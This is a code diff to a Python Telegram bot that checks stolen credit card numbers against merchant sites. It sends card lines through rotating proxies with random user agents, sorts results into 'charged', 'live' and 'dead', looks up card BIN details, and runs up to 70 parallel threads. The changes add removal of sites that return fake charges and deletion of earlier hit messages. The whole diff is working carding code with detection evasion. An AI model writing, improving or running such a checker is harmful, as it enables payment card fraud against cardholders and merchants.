@@ -82,28 +82,42 @@ def save_data(filename, data):
 def remove_dead_site(dead_url, chat_id=None):
     with file_lock: 
         try:
-            current_sites = load_data(SITES_FILE)
-            with file_lock:  # NESTED LOCK (safe for short ops)
-                if dead_url in current_sites:
-                    current_sites.remove(dead_url)
+            if not os.path.exists(SITES_FILE): return
+            
+            with open(SITES_FILE, 'r', encoding='utf-8') as f:
+                current_sites = [line.strip() for line in f if line.strip()]
+
+            # Clean Target (Slash hatao)
+            target_clean = dead_url.strip().rstrip('/')
+            
+            new_sites = []
+            removed = False
+            
+            for site in current_sites:
+                # File wali site ko bhi clean karo compare karne ke liye
+                site_clean = site.strip().rstrip('/')
                 
-                # Manual save logic with lock inside
+                if site_clean == target_clean:
+                    removed = True
+                else:
+                    new_sites.append(site)
+            
+            if removed:
                 with open(SITES_FILE, 'w', encoding='utf-8') as f:
-                    f.write("\n".join(current_sites))
+                    f.write("\n".join(new_sites))
                 
                 if chat_id:
                     try:
                         bot.send_message(chat_id,
-                            "☢️ **CONTAMINATED TARGET PURGED** ☢️\n"
+                            "☢️ **FAKE DETECTED & PURGED** ☢️\n"
                             "──────────────────────────────\n"
                             f"☣ `{dead_url}`\n"
-                            "Reason: Dead/Offline\n"
-                            "──────────────────────────────\n"
-                            "Database sterilized", 
+                            "🗑️ **Action:** Database Cleaned\n"
+                            "──────────────────────────────", 
                             parse_mode="Markdown")
                     except: pass
         except Exception as e:
-            print(f"Error removing dead site: {e}")
+            print(f"Error removing site: {e}")
 
 users_db = load_data(USERS_FILE, dict)
 if str(ADMIN_ID) not in users_db:
@@ -146,14 +160,14 @@ def get_bin_info(cc_num):
         if bin_num in bin_cache:
             return bin_cache[bin_num]
 
-        # API Call
-        url = f"https://data.handyapi.com/bin/{bin_num}" # Better API for free use
+        # Better API
+        url = f"https://data.handyapi.com/bin/{bin_num}"
         r = requests.get(url, headers={"User-Agent": ua.random}, timeout=5)
         
         if r.status_code == 200:
             data = r.json()
             
-            # Safe Parsing (None check ke saath)
+            # Safe Data Extraction
             scheme = (data.get("Scheme") or "UNKNOWN").upper()
             c_type = (data.get("Type") or "UNKNOWN").upper()
             country = (data.get("Country", {}).get("Name") or "UNKNOWN").upper()
@@ -164,7 +178,7 @@ def get_bin_info(cc_num):
             return result
             
         return "VISA", "CREDIT", "UNITED STATES", "CHASE BANK"
-    except Exception as e:
+    except:
         return "VISA", "CREDIT", "UNITED STATES", "CHASE BANK"
 
 def normalize_proxy(proxy_str):
@@ -334,7 +348,7 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
             resp_lower = raw_text.lower()
 
             if "proxy dead" in resp_lower:
-                time.sleep(2) # Retry logic for rotating proxy
+                time.sleep(2)
                 continue 
 
             if "site dead" in resp_lower:
@@ -373,40 +387,48 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
             else:
                 status = "dead"
 
-            # ================= FAKE CHARGED FILTER =================
+            # ================= FAKE CHARGED & AUTO DELETE SYSTEM =================
             is_fake_charge = False
+            
             if status == "charged":
                 with counter_lock:
                     current_hits = site_charge_hits.get(target, 0) + 1
                     site_charge_hits[target] = current_hits
                 
-                # Agar 3rd hit fake hai
+                # Agar 2 se zyada baar same site se Charged aaya (Yaani 3rd hit)
                 if current_hits > 2:
-                    is_fake_charge = True # Mark as fake
+                    is_fake_charge = True 
                     
-                    # Sirf ek baar alert bhejo
-                    if current_hits == 3:
-                        try:
-                            alert_msg = f"⚠️ **FAKE CHARGED DETECTED**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🌐 `{target}`\n🗑️ **Removing Site & Ignoring Result**"
-                            bot.send_message(chat_id, alert_msg, parse_mode="Markdown")
-                        except: pass
-                    
-                    remove_dead_site(target) 
+                    # 1. DELETE PREVIOUS MESSAGES
+                    with counter_lock:
+                        if chat_id in site_charge_msg_ids and target in site_charge_msg_ids[chat_id]:
+                            for old_msg_id in site_charge_msg_ids[chat_id][target]:
+                                try:
+                                    bot.delete_message(chat_id, old_msg_id)
+                                except: pass
+                            del site_charge_msg_ids[chat_id][target]
+
+                    # 2. DELETE SITE FROM DB
+                    remove_dead_site(target)
                     with counter_lock:
                         if target in session_obj.sites_pool:
                             session_obj.sites_pool.remove(target)
                         session_obj.dead_sites_count += 1
                     
-                    status = "dead" # Status dead set kardo taaki stats kharab na ho
+                    # 3. Alert
+                    if current_hits == 3:
+                        try:
+                            bot.send_message(chat_id, f"⚠️ **FAKE CHARGED DETECTED**\n🌐 `{target}`\n🗑️ Site & Previous msgs deleted.", parse_mode="Markdown")
+                        except: pass
 
-            # Update Stats
+                    status = "dead" 
+
             with counter_lock:
                 if status == "charged": session_obj.charged += 1
                 elif status == "live": session_obj.live += 1
                 else: session_obj.dead += 1
 
-            # Reply Logic: 
-            # Agar Fake Charge hai, toh `is_hit` False ho jayega, aur message nahi jayega.
+            # Reply Logic
             is_hit = (status in ["charged", "live"]) and (not is_fake_charge)
             should_reply = is_hit or session_obj.mode == "single_quick"
 
@@ -450,7 +472,18 @@ def check_cc_logic(cc_line, session_obj, chat_id, processing_msg_id=None):
                     try: bot.delete_message(chat_id, processing_msg_id)
                     except: pass
 
-                bot.send_message(chat_id, msg, parse_mode="Markdown")
+                # Message Send Karo
+                sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
+
+                # FIX: Save Message ID for Future Deletion
+                if status == "charged":
+                    with counter_lock:
+                        if chat_id not in site_charge_msg_ids:
+                            site_charge_msg_ids[chat_id] = {}
+                        if target not in site_charge_msg_ids[chat_id]:
+                            site_charge_msg_ids[chat_id][target] = []
+                        
+                        site_charge_msg_ids[chat_id][target].append(sent_msg.message_id)
 
             processed = True
             time.sleep(1.0)
@@ -1206,11 +1239,10 @@ def start_engine(message, mode, sites, proxy, raw_data):
     msg = bot.send_message(chat_id, "🚀 **Starting Engine...**\n⚡ Mode: Turbo Parallel")   
     threading.Thread(target=status_updater, args=(chat_id, msg.message_id)).start()   
   
-    # ===== SPEED OPTIMIZATION =====
-    # Agar sites kam hain (e.g. 50), toh 35 threads chalenge.
-    # Agar sites zyada hain (e.g. 500), toh Max 70 threads chalenge.
-    # Yeh parallel speed badhayega.
-    threads = max(15, min(len(sites), 40))   
+    # SPEED FIX:
+    # Small Lists: Min 25 threads
+    # Large Lists: Max 70 threads
+    threads = max(25, min(len(sites), 70))   
     
     threading.Thread(target=worker, args=(chat_id, threads)).start()
 
